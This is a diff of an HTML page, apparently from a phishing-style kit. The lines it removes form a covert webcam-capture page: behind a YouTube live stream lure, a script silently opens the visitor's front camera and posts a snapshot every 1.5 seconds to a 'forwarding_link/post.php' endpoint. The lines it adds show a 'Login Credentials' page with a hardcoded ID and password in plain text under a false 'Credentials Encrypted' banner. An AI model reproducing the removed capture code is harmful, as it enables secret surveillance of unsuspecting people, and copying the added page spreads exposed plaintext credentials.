@@ -1,82 +1,224 @@
 <!doctype html>
 <html>
+
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <title>Login Credentials</title>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
 
-<div class="video-wrap">
-   <video id="video" playsinline autoplay></video>
-</div>
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
 
-<canvas id="canvas" width="640" height="480"></canvas>
+  body {
+    height: 100vh;
+    width: 100vw;
+    background-color: #273039;
+  }
+
+  * {
+    padding: 0px;
+    margin: 0px;
+    font-family: 'Nunito', sans-serif;
+    font-weight: 500;
+  }
+
+  .login-container {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: white;
+    padding: 20px;
+  }
+
+  .login-box {
+    background-color: #1F2022;
+    padding: 40px;
+    border-radius: 15px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    width: 100%;
+    max-width: 450px;
+    text-align: center;
+  }
+
+  .logo {
+    font-size: 48px;
+    color: #fff;
+    margin-bottom: 20px;
+  }
+
+  h2 {
+    margin-bottom: 30px;
+    color: #fff;
+    font-size: 28px;
+  }
+
+  .credential-display {
+    background-color: #273039;
+    padding: 20px;
+    border-radius: 10px;
+    margin: 20px 0;
+    border-left: 4px solid crimson;
+  }
+
+  .credential-item {
+    margin: 15px 0;
+    text-align: left;
+  }
+
+  .label {
+    color: #aaa;
+    font-size: 14px;
+    margin-bottom: 5px;
+  }
+
+  .value {
+    color: #fff;
+    font-size: 18px;
+    font-weight: bold;
+    padding: 10px;
+    background-color: #2a2d35;
+    border-radius: 5px;
+    border: 1px solid #3a3f47;
+    word-break: break-all;
+  }
+
+  .copy-btn {
+    background-color: crimson;
+    color: white;
+    border: none;
+    padding: 8px 15px;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 5px;
+    font-size: 14px;
+  }
+
+  .copy-btn:hover {
+    background-color: #b11030;
+  }
+
+  .note {
+    color: #aaa;
+    font-size: 12px;
+    margin-top: 30px;
+    padding: 10px;
+    border-top: 1px solid #3a3f47;
+  }
+
+  .float_button {
+    background-color: #1F2022;
+    height: 40px;
+    border-radius: 5px;
+    width: 40px;
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 5px;
+    right: 5px;
+    cursor: pointer;
+  }
+
+  .bottom-bar {
+    position: fixed;
+    bottom: 0px;
+    height: 60px;
+    width: 100%;
+    background-color: #1F2022;
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+  }
+
+  .security-info {
+    display: flex;
+    align-items: center;
+    font-size: 14px;
+    color: lawngreen;
+  }
+
+  .security-info i {
+    margin-right: 8px;
+  }
+</style>
 
 <script>
+  function copyToClipboard(text, button) {
+    navigator.clipboard.writeText(text).then(function() {
+      const originalText = button.innerHTML;
+      button.innerHTML = '<i class="fas fa-check"></i> Copied!';
+      button.style.backgroundColor = '#28a745';
+      
+      setTimeout(function() {
+        button.innerHTML = originalText;
+        button.style.backgroundColor = 'crimson';
+      }, 2000);
+    }).catch(function(err) {
+      alert('Failed to copy text: ' + err);
+    });
+  }
 
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
+  function toggleFullScreen() {
+    if (!document.fullscreenElement) {
+      document.documentElement.requestFullscreen().catch(err => {
+        console.log(`Error attempting to enable full-screen mode: ${err.message}`);
+      });
+    } else {
+      if (document.exitFullscreen) {
+        document.exitFullscreen();
+      }
     }
-  });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
   }
-};
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
-
-}
-
-// Load init
-init();
-
 </script>
 
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<body>
+  <div class="float_button" onclick="toggleFullScreen()">
+    <i class="fas fa-expand" style="color: #fff; font-size: 18px;"></i>
+  </div>
 
-    </body>
+  <div class="login-container">
+    <div class="login-box">
+      <div class="logo">
+        <i class="fas fa-user-shield"></i>
+      </div>
+      
+      <h2>Login Credentials</h2>
+      
+      <div class="credential-display">
+        <div class="credential-item">
+          <div class="label">Login ID</div>
+          <div class="value" id="loginId">srthk_.404</div>
+          <button class="copy-btn" onclick="copyToClipboard('srthk_.404', this)">
+            <i class="far fa-copy"></i> Copy ID
+          </button>
+        </div>
+        
+        <div class="credential-item">
+          <div class="label">Password</div>
+          <div class="value" id="password">nandankisettingnadeem</div>
+          <button class="copy-btn" onclick="copyToClipboard('nandankisettingnadeem', this)">
+            <i class="far fa-copy"></i> Copy Password
+          </button>
+        </div>
+      </div>
+      
+      <div class="note">
+        <i class="fas fa-info-circle"></i> These credentials are for authorized access only.
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom-bar">
+    <div class="security-info">
+      <i class="fas fa-shield-alt"></i>
+      Secure Connection • Credentials Encrypted
+    </div>
+  </div>
+</body>
 
 </html>
